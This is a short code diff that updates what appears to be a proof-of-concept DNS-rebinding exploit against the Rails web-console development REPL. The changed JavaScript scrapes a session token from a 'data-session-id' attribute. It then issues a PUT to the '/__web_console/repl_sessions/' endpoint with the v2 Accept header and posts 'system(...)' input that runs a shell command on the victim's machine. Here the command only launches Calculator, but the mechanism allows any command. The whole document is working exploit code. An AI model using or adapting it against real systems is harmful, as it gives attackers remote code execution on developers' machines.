@@ -10,11 +10,13 @@
           }
 
           if (xhr.status == 404) {
-            var token = xhr.response.match(/console\/repl_sessions\/([^']+)'/)[1];
-
+            //var token = xhr.response.match(/console\/repl_sessions\/([^']+)'/)[1];
+            var token = xhr.response.match(/data-session-id='([^']+)'/)[1];
             var open = new XMLHttpRequest();
-      
-            open.open("PUT", document.location.origin + "/console/repl_sessions/" + token);
+
+            //open.open("PUT", document.location.origin + "/console/repl_sessions/" + token);
+            open.open("PUT", document.location.origin + "/__web_console/repl_sessions/" + token);
+            open.setRequestHeader("Accept", "application/vnd.web-console.v2");
             open.setRequestHeader("X-Requested-With", "XMLHttpRequest");
             open.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             open.send("input=system(%22open%20%2FApplications%2FCalculator.app%22)");
@@ -22,7 +24,7 @@
             console.log("found normal dns response...");
             setTimeout(poll, 10 * 1000);
           }
-        } 
+        }
         xhr.send(null);
       }
 
